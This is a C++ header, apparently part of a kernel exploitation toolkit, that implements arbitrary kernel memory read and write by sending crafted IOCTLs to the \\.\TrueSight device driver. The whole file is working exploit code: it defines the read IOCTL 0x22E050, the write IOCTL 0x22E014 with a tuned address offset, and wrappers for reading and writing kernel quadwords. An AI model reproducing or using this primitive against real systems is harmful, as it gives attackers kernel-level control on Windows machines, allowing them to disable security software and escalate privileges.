#pragma once

#include "KernelReadWrite.h"
#include "Log.h"
#include "Utils.h"

class TrueSightRw : public KernelReadWrite {
public:
	TrueSightRw() : m_Handle(0) {
		m_Handle = CreateFileA("\\\\.\\TrueSight", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (m_Handle == INVALID_HANDLE_VALUE) {
			LOG_FAIL("Failed to open truesight, le=%d", GetLastError());
		}
	}

	std::vector<BYTE> ReadBuffer(kAddress Address, ULONG Size) override {
		constexpr ULONG MemoryReadIoctl = 0x22E050;

		struct {
			kAddress TargetAddress;
			ULONG OutputLength;
		} memoryReadParameters = { Address, Size };

		static_assert(sizeof(memoryReadParameters) == 0x10, "Incorrect size of read parameters");

		auto* outputBuffer = new BYTE[Size];

		if (!DeviceIoControl(m_Handle, MemoryReadIoctl, &memoryReadParameters, sizeof(memoryReadParameters), outputBuffer, Size, nullptr, nullptr)) {
			LOG_FAIL("Failed to send read ioctl, le=%d", GetLastError());
			throw std::runtime_error("truesight");
		}

		std::vector<BYTE> result(outputBuffer, outputBuffer + Size);
		return result;
	}

	Qword ReadQword(kAddress Address) {
		std::vector<BYTE> buffer = this->ReadBuffer(Address, sizeof(Qword));
		auto result = *reinterpret_cast<Qword*>(buffer.data());
		return result;
	}

	void WriteQword(kAddress Address, Qword Value) {
		constexpr ULONG MemoryWriteIoctl = 0x22E014;

		//
		// Paramters for MemoryWriteIoctl.
		//
		struct {
			kAddress TargetAddress;
			ULONG Zero;
			Qword Value;
		} memoryWriteParamters = { Address - 8 * 14, 0, Value };

		static_assert(sizeof(memoryWriteParamters) == 0x18, "Incorrect size of write parameters");

		if (!DeviceIoControl(
			m_Handle,
			MemoryWriteIoctl,
			&memoryWriteParamters,
			sizeof(memoryWriteParamters),
			nullptr, 0, nullptr, nullptr
		)) {
			LOG_FAIL("Failed to send write ioctl, le=%d", GetLastError());
			throw std::runtime_error("truesight");
		}
	}

	~TrueSightRw() {
		if (m_Handle != INVALID_HANDLE_VALUE) {
			CloseHandle(m_Handle);
		}
	}

private:
	HANDLE m_Handle;
};